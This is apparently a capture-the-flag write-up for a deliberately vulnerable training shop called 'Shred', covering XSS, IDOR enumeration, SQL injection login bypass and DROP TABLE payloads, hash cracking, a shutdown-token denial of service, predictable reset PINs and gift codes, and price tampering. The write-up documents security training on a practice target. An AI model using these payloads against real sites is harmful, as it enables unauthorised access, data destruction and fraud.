# CHALLENGE: SHRED

## Challenge Description

Site: https://play.cmdnctrl.net
Code: 

### INSPECT HTML CODE

Skulking around the HTML source for the site, we come across this comment
in the code..

```
<h2>Return Customers</h2>
<!--  TODO: Remember to remove the test/test account once we release. We don't want hackers breaking in! -->
```

Using the credentials `test/test`, we gain access to the site!

```
CHALLENGE COMPLETED: Test Credentials in HTML Comments: 50
```

### ENUMERATE ACCOUNTS (INSUFFICIENT AUTHORIZATION)

As we browse our account details, we notice that in the URL what appears to be
our account number.

```
http://34-222-117-67-shred.vulnerablesites.net/Shred/accountSettings?id=235861
```

Modifying our account number from `235861` to `235862` we find we can access
the account details of someone named "Linwood Cole"! Continuing to increment
the account number reveals other accounts as well.

```
http://34-222-117-67-shred.vulnerablesites.net/Shred/accountSettings?id=235861
Testy Tester
http://34-222-117-67-shred.vulnerablesites.net/Shred/accountSettings?id=235862
Linwood Cole
http://34-222-117-67-shred.vulnerablesites.net/Shred/accountSettings?id=235863
Arjun Leuschke
<...>
```

```
CHALLENGE COMPLETED: View Another User's Account Information: 100
```

### CROSS SITE SCRIPTING

We see a search box on the site, so let's test to see if it is vulnerable to
cross-site scripting by searching for something like:

```
<script>alert(1)</script>
```

.. and we see a pop up box which shows our code was executed!

```
CHALLENGE COMPLETED: <script>alert("XSS on Product Search");</script>: 200 points
```

### ROBOTS.TXT

Inspecting the `robots.txt` file for the site..

```
http://34-222-117-67-shred.vulnerablesites.net/Shred/robots.txt

User-agent: *
Disallow: /user_profile
Allow: /credits
```

.. we find discover two new directories..

```
http://34-222-117-67-shred.vulnerablesites.net/Shred/credits
http://34-222-117-67-shred.vulnerablesites.net/Shred/user_profile
```

Loading the `credits` page gets us some points. Loading `user_profile` gives
us the following error message:

```
{"profile":{"error":"invalid user id"}}
```

```
CHALLENGE COMPLETED: Show of Appreciation (View the Credits Page): 10
```

```
http://34-222-117-67-shred.vulnerablesites.net/Shred/user_profile?id=235861
{"profile":{"username":"test","email":"test@test.com","password_hash":"a94a8fe5ccb19ba61c4c0873d391e987982fbbd3","user_id":"235861"}}
```

### SQL INJECTION

Logging out of the account and attempting to test some SQL injection against
our login form by supplying `\'` as input, we get..

```
Error executing SQL query: SELECT * FROM Users WHERE username = '\\'' AND passhash = '6acdcb3cb13891c3138d19ef2799d56a151c9bbf'; 

Details: com.fjordengineering.store.util.SecureSQLException: SELECT * FROM Users WHERE username = '\\'' AND passhash = '6acdcb3cb13891c3138d19ef2799d56a151c9bbf';
```

As we receive the following points..

```
CHALLENGE COMPLETE: Tampering with SQL Queries for Information Disclosure: 10 points
```

### BYPASSING AUTHENTICATION

So now that we have some details about the SQL query being used, let's see if
we can bypass the authentication check.

```
SELECT * FROM Users WHERE username = '\\'' AND passhash = '6acdcb3cb13891c3138d19ef2799d56a151c9bbf'
```

We see that there is a `username=foo AND passhash=bar` pattern. What if we can
comment out the `AND passhash` check?

```
test\'# ==> Authentication failed for user test\\'#
test\' and 1=1 ==> SELECT * FROM Users WHERE username = 'test\\' AND 1=1' AND passhash = '3c363836cf4e16666669a25da280a1865c2d2874'
```

We need to first find a way to break out of the user string, but there seems to
be some escaping that happens since everytime we try to use the `'` character
it complains about `Authentication failed for user test\'`.

```
\' OR  1=1#
```

```
CHALLENGE COMPLETE: SQL Injection Authentication Bypass: 300 points
```

### VIEW DATABASE TABLES

Let's see what other SQL we can inject..

```
\'; SELECT * FROM INFORMATION_SCHEMA.TABLES;#
```

```
CHALLENGE COMPLETED: Modify SQL Database via SQL Injection (Login Field): 300 points
```

### DROP TABLE

We have discovered there is a table `Users` based on the SQL error caused by
out attempted SQL injections. Maybe we can try to drop the table?

```
\' OR 1=1; DROP TABLE Users;#
\'; DROP TABLE Users;#
```

### PASSWORD HASH

In the SQL injection section, we saw `passhash` leaked that appeared to be SHA1.

```
https://www.sha1online.org/

4d8f35e9ae9055a743132bc726720c4e8e1d0b1c => february
```

http://34-222-117-67-shred.vulnerablesites.net/Shred/user_profile?id=235863


```
CHALLENGE COMPLETED: Password Cracking: 175 points
```

```
View User Info through Testing API: 200 points
```

### ORDERID

Logging in as Linwood, we can see they have a past order which we can capture the URL to enumerate:

http://34-222-117-67-shred.vulnerablesites.net/Shred/pastOrder?orderId=38631

```
CHALLENGE COMPLETED: View Another User's Past Orders: 100 points
```

### CRYPTO

http://34-222-117-67-shred.vulnerablesites.net/Shred/product.action?itemId=346873

```
Qvl Cbjplsqjtg pq Taml Pwli Jmm
Pwec cbjplsqjtg ec kemmlg fepw pwl gjtb zqfltc qk pwl Zqclt Mqtg. Ep stevnc lhptlil cbjpl cbemmc pq fwqlrlt zqcclcclc ep, sap jmcq dqttazpc pwlet cqam. Pq ztlrlvp lrem ktqi cztljgevn jdtqcc pwl mjvg, pwtqf ep evpq pwl Wjmk-Zezl qk Kmjil jp /Cwtlg/WjmkZezlQkKmjil.
```

```
https://quipqiup.com/

One Skateboard to Rule Them All This skateboard is filled with the dark powers of the Poser Lord. It brin?s e?treme skate skills to whoever possesses it, but also ?orrupts their soul. To prevent evil from spreadin? a?ross the land, throw it into the Half-Pipe of Flame at /Shred/HalfPipeOfFlame.
```

```
CHALLENGE COMPLETED: Vanquish the Poser Lord (Cryptanalysis of Substitution Cipher): 250 points
```

### SHOPPING CART (FORCEFUL BROWSING)

Logged in as Linwood, we can add items to his cart but instead of completing the order, there is an edit order option
which redirects to the following URL..

```
http://34-222-117-67-shred.vulnerablesites.net/Shred/editOrder.action?orderId=38722
```

If we log back in as user `test` and attempt to access that URL.. we find that we can.

```
CHALLENGE COMPLETED: View Another User's In-Progress Order: 100 points
```

### SOCIAL ENGINEERING

```
Looks like we just took a gnarly fall. Try your request again, or click here to go back to the main page. If this error persists, please contact our webmaster at arnoldtpoodle@gmail.com.
```

```
https://www.linkedin.com/in/arnold-t-poodle-103232a3/

Writing the Fjord Framework, specifically version 2.3.
```

```
http://fjordwebengineering.blogspot.com/2014/09/fjord-engineering-framework-v23_17.html

Fjord Engineering Framework v2.3 has a Denial of Service vulnerability with the architecture. We are currently working on getting a hot fix out.

Hey, for anyone who wants to test their own servers: hitting the endpoint /kill with query parameter shutDownToken set to ae450g9dg shuts down the whole web server. You should upgrade to v2.4 immediately once the hot fix goes out.
```

```
http://34-222-117-67-shred.vulnerablesites.net/Shred/kill?shutDownToken=ae450g9dg
```

```
CHALLENGE COMPLETED: Denial of Service through Known Vulnerable Software: 600 points
```

### RESET PASSWORD PIN

Creating a new user `filo`, we receive a Password Reset PIN that is just the SHA1 encrypted string of our username.

```
filo Password Reset PIN: 55771c7ffcd86ed89b00a283572e140607e43334
```

So using the password request function for Linwood Cole with PIN `950c038c64139dbc6e606d7cbfb020694f84b308`

```
CHALLENGE COMPLETED: Weak Password Reset: 600 points
```

### PRIVATE PHOTO

We can view the public gallery and enumerate the URL to access someone's private photos..

```
http://34-222-117-67-shred.vulnerablesites.net/Shred/viewPhoto?photoId=93883
```

```
CHALLENGE COMPLETED: See Someone Else's Private Photo: 100 points
```

### GIFT CODE (STEALING)

We used Linwood's account to purchase a gift card, we find a URL that allows the receipt to claim.

```
http://34-222-117-67-shred.vulnerablesites.net/Shred/viewGiftCard?code=eyJpZCI6MTAyfQ%3D%3D
```

Using base64 to decode the `code`, we find it resolves to `{"id":102}`.

```
{"id":101}
eyJpZCI6MTAxfQ==
http://34-222-117-67-shred.vulnerablesites.net/Shred/viewGiftCard?code=eyJpZCI6MTAxfQ%3D%3D
```

Eventually we try `eyJpZCI6MTAwfQ%3D%3D` and that gets us a gift card from Celia.

```
CHALLENGE COMPLETED: Predictable Gift Card Redemption Code: 250 points
```

### GIFT CODE (DISCOUNT)

We also discover that the gift card purchase is validated on the client side. By inspecting the HTML element
of the drop down box in choosing which gift card we want to purchase. By editing the `value` parameter to
something like `10000.00`, we enable ourselves to buy a $10,000 for $25.00.

```
CHALLENGE COMPLETE: Gift Cardz 4 Cheap (Hidden Form Field Manipulation): 150 points
```

### COOKIE MANIPULATION

When we try to purchase a skateboard, we find that the shopping cart detail is stored in the cookie and
we can end up modifying the cart total!

```
CHALLENGE COMPLETE: Skateboardz 4 Cheap (Cookie Tampering): 150 points
```

### PIE PHOTO

Took a hint and was directed to the pie photo in the gallery.

```
$ strings pie.jpg
Mmmmmmmmmm, pie sure is delicious! We have lots of pie...but only for members of the Pi Club, who were born on Pi Day.
```

Tried doing something with the Pie_Club user (reseting password, logging in, browsing..), but to no avail.

```
{"profile":{"username":"Pie_Club","email":"PieClub@delicious.pie","password_hash":"0f4ef7cba35ade6bd6f34ed974f22de895f0e2cd","user_id":"235962"}}\n

Password Rest PIN: 023103a4ac683dbc61f6dae90fe51248ae56a742 (SHA1 encoding of Pie_Club)
```

But then seeing that it is "members of the Pi Club", went to try and change Linwood's birthday to 03/14 and that triggered it..

```
CHALLENGE COMPLETED: Joining the Pi Club: 500 points
```

### REVIEWING PRODUCT YOU AREN'T ALLOWED TO

When we try and review a product we haven't purchased, we aren't allowed
to review the product. Inspecting the HTML we discover this is accomplished
by hiding the form. By removing the `hide` key word from that element, we
are now allowed to submit a review for a product we didn't buy~

```
CHALLENGE COMPLETED: Review a Product You Didn't Buy: 150 points
```
